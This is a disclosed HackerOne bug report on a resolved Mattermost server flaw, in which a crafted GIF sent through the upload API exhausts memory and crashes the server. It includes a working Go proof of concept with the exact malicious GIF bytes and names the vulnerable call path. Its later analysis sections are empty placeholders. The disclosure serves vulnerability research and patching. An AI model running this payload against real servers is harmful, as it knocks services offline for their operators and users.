---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1620170'
original_report_id: '1620170'
title: 'DOS: out of memory from gif through upload api'
weakness: Uncontrolled Resource Consumption
team_handle: mattermost
created_at: '2022-06-30T09:41:37.470Z'
disclosed_at: '2022-09-21T08:49:00.175Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: mattermost/mattermost-server
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# DOS: out of memory from gif through upload api

## Metadata

- HackerOne Report ID: 1620170
- Weakness: Uncontrolled Resource Consumption
- Program: mattermost
- Disclosed At: 2022-09-21T08:49:00.175Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
When sending a specially crafted gif with max dimensions through the upload API, we get Mattermost server to consume more than 4Gbytes of RAM

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Run `docker run --name mattermost-preview -d --publish 8065:8065 mattermost/mattermost-preview -m=4G` as documented https://docs.mattermost.com/guides/deployment.html with 4G limit from https://docs.mattermost.com/install/software-hardware-requirements.html#hardware-requirements-for-team-deployments
  1. Get one channel id
  1. Run this simple POC below with a valid channel id
  1. Docker container gets killed

```
package main

import (
	"bytes"
	"fmt"
	"github.com/mattermost/mattermost-server/v5/model"
)

func main() {
	Client := model.NewAPIv4Client("http://localhost:8065/")
	Client.Login("toto", "tototo")
	us := &model.UploadSession{
		ChannelId: "5dtj9hf89ifap8imigbzjc7wjo",
		Filename:  "oom.gif",
		FileSize:  31,
	}
	us, response := Client.CreateUpload(us)
	fmt.Printf("lol %s %#+v\n", us, response)
	data := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x2e, 0xf8, 0xff, 0xff, 0xf, 0x18, 0x18, 0x2c, 0x7f, 0x20, 0x0, 0x0, 0x0, 0xa0, 0xff, 0xff, 0xff, 0xd4, 0x9a, 0xf0, 0xb4, 0x8, 0x35, 0x4, 0x0}
	info, err2 := Client.UploadData(us.Id, bytes.NewReader(data))
	fmt.Printf("lol %s %#+v\n", err2, info)
}
```

This happens with `gif.DecodeAll` being called by `GetInfoForBytes` getting called by `App.UploadData` being called by `doUploadData` being called by `uploadData` without any call to `preprocessImage` as is done in the `api/v4/files` route

Docker container gets killed

## Impact

Crash a server

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
